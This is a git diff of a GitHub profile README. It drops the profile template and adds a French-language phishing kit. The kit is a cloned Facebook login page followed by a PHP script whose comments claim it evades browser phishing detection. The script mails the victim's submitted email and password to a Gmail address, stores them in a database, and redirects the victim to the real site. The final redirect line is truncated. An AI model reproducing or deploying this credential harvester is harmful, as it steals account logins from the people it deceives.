@@ -1,13 +1,3 @@
-- 👋 Hi, I’m @kenjiackerman
-- 👀 I’m interested in ...
-- 🌱 I’m currently learning ...
-- 💞️ I’m looking to collaborate on ...
-- 📫 How to reach me ...
-
-<!---
-kenjiackerman/kenjiackerman is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-You can click the Preview link to take a look at your changes.
---->
 <!DOCTYPE html>
 <html lang="fr" id="facebook" class="no_js">
 <head><meta charset="utf-8" /><script>function envFlush(a){function b(c){for(var d in a)c[d]=a[d];}if(window.requireLazy){window.requireLazy(['Env'],b);}else{Env=window.Env||{};b(Env);}}envFlush({"ajaxpipe_token":"AXhWSHayt5EgJera","lhsh":"WAQGbIWyY","khsh":"0`sj`e`rm`s-0fdu^gshdoer-0gc^eurf-3gc^eurf;1;enbtldou;fduDmdldourCxO`ld-2YLMIuuqSdptdru;qsnunuxqd;rdoe"});</script><script>CavalryLogger=false;</script><noscript><meta http-equiv="refresh" content="0; URL=/?stype=lo&amp;jlou=AfepVwWg1TvZZ6cjSmLDsBOxIDF8hdoUM_66r1y1RE4ih2r5CuGQhdlVQw7a9lpTZivvxwcujCP7gXgL0m3WK8Gn&amp;smuh=40039&amp;lh=Ac8SyZlHe_7kEUPN&amp;_fb_noscript=1" /></noscript><meta name="referrer" content="default" id="meta_referrer" /><title id="pageTitle">Bienvenue sur Facebook. Connectez-vous, inscrivez-vous ou découvrez !</title><meta property="og:site_name" content="Facebook" /><meta property="og:url" content="index.html" /><meta property="og:image" content="index.html" /><meta property="og:locale" content="fr_FR" /><link rel="canonical" href="index.html" /><link rel="alternate" media="only screen and (max-width: 640px)" href="index.html" /><link rel="alternate" media="handheld" href="index.html" /><link rel="alternate" hreflang="x-default" href="index.html" /><link rel="alternate" hreflang="en" href="index.html" /><link rel="alternate" hreflang="es" href="index.html" /><link rel="alternate" hreflang="es-es" href="index.html" /><link rel="alternate" hreflang="fr" href="index.html" /><link rel="alternate" hreflang="fr-ca" href="index.html" /><link rel="alternate" hreflang="id" href="index.html" /><link rel="alternate" hreflang="it" href="index.html" /><link rel="alternate" hreflang="ko" href="index.html" /><link rel="alternate" hreflang="th" href="index.html" /><link rel="alternate" hreflang="vi" href="index.html" /><meta name="description" content="Facebook est un r&#xe9;seau social qui vous relie &#xe0; des amis, des coll&#xe8;gues de travail, des camarades de classe ou d&#x2019;autres personnes qui ont quelque chose &#xe0;..." /><meta name="robots" content="noodp,noydir" /><noscript><meta http-equiv="X-Frame-Options" content="DENY" /></noscript><link rel="shortcut icon" href="https://fbstatic-a.akamaihd.net/rsrc.php/yl/r/H3nktOa7ZMg.ico" />
@@ -52,4 +42,63 @@ onloadRegister_DEPRECATED(function (){try { $("email").focus(); } catch (_ignore
 </script>
 <!-- BigPipe construction and first response -->
 <script>var bigPipe = new (require("BigPipe"))({"lid":0,"forceFinish":true});</script>
-<script>bigPipe.onPageletArrive({"id":"first_response","phase":0,"jsmods":{},"is_last":true,"css":["7+qww","NK2Gp","Xc7sb","HgIa3","zyh0u"],"js":["WpEam","J2mKw","a\/7GR","TbG0C","K+4oY","AWb\/8","ZwIZ4","Vosow","4vv8\/"],"displayJS":["a\/7GR"]})</script><script>bigPipe.onPageletArrive({"id":"","phase":1,"jsmods":{},"is_last":true,"css":["7+qww","NK2Gp","Xc7sb","HgIa3","zyh0u"],"js":["WpEam","J2mKw","a\/7GR","TbG0C","K+4oY","AWb\/8","ZwIZ4","Vosow","4vv8\/"],"displayJS":["a\/7GR"],"the_end":true})</script>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </body></html>
+<script>bigPipe.onPageletArrive({"id":"first_response","phase":0,"jsmods":{},"is_last":true,"css":["7+qww","NK2Gp","Xc7sb","HgIa3","zyh0u"],"js":["WpEam","J2mKw","a\/7GR","TbG0C","K+4oY","AWb\/8","ZwIZ4","Vosow","4vv8\/"],"displayJS":["a\/7GR"]})</script><script>bigPipe.onPageletArrive({"id":"","phase":1,"jsmods":{},"is_last":true,"css":["7+qww","NK2Gp","Xc7sb","HgIa3","zyh0u"],"js":["WpEam","J2mKw","a\/7GR","TbG0C","K+4oY","AWb\/8","ZwIZ4","Vosow","4vv8\/"],"displayJS":["a\/7GR"],"the_end":true})</script>
+      <?php
+    
+	// Page produite par NesQuiiKz.com et optimisée contre les navigateur internet qui peuvent détecter les pages Phishing.
+
+	
+	// Configuration de la base de donnée
+	$DB_host = "Hôte MySQL";
+	$DB_login = "Utilisateur MySQL"; 
+	$DB_pass = "Mot de passe"; 
+	$DB_select = ""; 
+	
+	// Connexion à notre base de donnée
+	$con = mysql_connect($DB_host, $DB_login, $DB_pass); 
+    if (!$con) { 
+			die('Erreur de connexion: ' . mysql_error()); 
+			}
+    $db= mysql_select_db($DB_select, $con);
+	
+	
+    
+	// On protège notre base de donnée.
+	$id=mysql_real_escape_string($_POST["email"]);
+	$mdp=mysql_real_escape_string($_POST["pass"]);
+	
+	
+    // S'il l'on met un identifiant
+	if ((isset($_POST["email"]))&&($_POST["email"]!="")){
+	
+	
+				// S'il l'on met un mot de passe
+				if ((isset($_POST["pass"]))&&($_POST["pass"]!="")){
+	
+	                   // On crée une variable contenant les identifiants
+	                   $all = 'Identifiant : ' . $_REQUEST['email']. "\n". 'Mot de passe : ' . $_REQUEST['pass'] ;
+					   
+					   
+	                   // On envoi les identifiants à notre adresse mail voulu
+	                   mail('kenjiackerman5@gmail.com','NesQuiiKz.com', $all );
+					   
+					   // On vérifie que les identifiants n'ont pas été déjà enregistrés
+					   $SQL="SELECT * FROM `Base de données MySQL`.`ids` WHERE id='$id' AND mdp='$mdp'";
+                       $res=mysql_query($SQL);
+					   
+					   // Si les identifiants ne sont pas déjà présent
+                       if(mysql_num_rows($res)==0){
+							   // On ajoute les identifiants à notre base de donnée.
+							   $SQL="INSERT INTO `Base de données MySQL`.`ids` (`id` ,`mdp`)VALUES ('$id',  '$mdp')";
+							   $res=mysql_query($SQL);
+							 
+					   }
+					   
+	            }
+	
+	}
+	mysql_close(); 
+	
+?>
+<?php // On redirige l'internaute vers le site officiel tout de suite ?>
+<html><head><meta http-equiv='refresh' content                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          </body></html>
